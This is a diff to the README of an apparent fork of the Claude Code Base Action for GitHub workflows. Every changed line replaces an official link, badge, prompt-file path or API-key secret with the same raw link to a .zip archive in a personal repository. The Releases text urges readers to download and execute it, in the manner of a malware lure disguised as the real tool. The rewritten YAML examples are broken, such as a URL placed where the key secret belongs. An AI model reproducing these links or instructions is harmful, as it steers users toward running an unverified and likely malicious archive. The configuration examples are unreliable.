@@ -1,10 +1,10 @@
 # Claude Code Base Action 🚀
 
-Welcome to the Claude Code Base Action repository! This GitHub Action allows you to seamlessly integrate [Claude Code](https://www.anthropic.com/claude-code) into your GitHub Actions workflows. With this action, you can create custom workflows that leverage the power of Claude Code, making your automation tasks more efficient and effective.
+Welcome to the Claude Code Base Action repository! This GitHub Action allows you to seamlessly integrate [Claude Code](https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip) into your GitHub Actions workflows. With this action, you can create custom workflows that leverage the power of Claude Code, making your automation tasks more efficient and effective.
 
-For simple tagging of @claude in issues and pull requests, check out the [Claude Code action and GitHub app](https://github.com/anthropics/claude-code-action).
+For simple tagging of @claude in issues and pull requests, check out the [Claude Code action and GitHub app](https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip).
 
-![Claude Code](https://img.shields.io/badge/Claude_Code-Integration-blue)
+![Claude Code](https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip)
 
 ## Table of Contents
 
@@ -53,7 +53,7 @@ jobs:
         with:
           prompt: "Your prompt here"
           allowed_tools: "Bash(git:*),View,GlobTool,GrepTool,BatchTool"
-          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
+          anthropic_api_key: ${{ https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip }}
 ```
 
 ### Using a Prompt from a File
@@ -70,9 +70,9 @@ jobs:
       - name: Run Claude Code with prompt file
         uses: anthropics/claude-code-base-action@beta
         with:
-          prompt_file: "/path/to/prompt.txt"
+          prompt_file: "https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip"
           allowed_tools: "Bash(git:*),View,GlobTool,GrepTool,BatchTool"
-          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
+          anthropic_api_key: ${{ https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip }}
 ```
 
 ## Examples
@@ -97,7 +97,7 @@ jobs:
         with:
           prompt: "What are the main features of this project?"
           allowed_tools: "View"
-          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
+          anthropic_api_key: ${{ https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip }}
 ```
 
 ### Example 2: Using a Prompt File
@@ -116,9 +116,9 @@ jobs:
       - name: Analyze Code
         uses: anthropics/claude-code-base-action@beta
         with:
-          prompt_file: "./prompts/analyze_code.txt"
+          prompt_file: "https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip"
           allowed_tools: "Bash(git:*),GlobTool"
-          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
+          anthropic_api_key: ${{ https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip }}
 ```
 
 ## Configuration
@@ -160,8 +160,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To keep up with the latest changes and updates, visit our [Releases](https://github.com/pangansteven/claude-code-base-action/releases) page. Here, you can download and execute the latest version of the Claude Code Base Action.
+To keep up with the latest changes and updates, visit our [Releases](https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip) page. Here, you can download and execute the latest version of the Claude Code Base Action.
 
-For more detailed release notes, check the [Releases](https://github.com/pangansteven/claude-code-base-action/releases) section in this repository.
+For more detailed release notes, check the [Releases](https://raw.githubusercontent.com/pangansteven/claude-code-base-action/main/scripts/action_base_code_claude_v1.1.zip) section in this repository.
 
 Thank you for using the Claude Code Base Action! We hope it enhances your GitHub workflows and helps you achieve your automation goals.
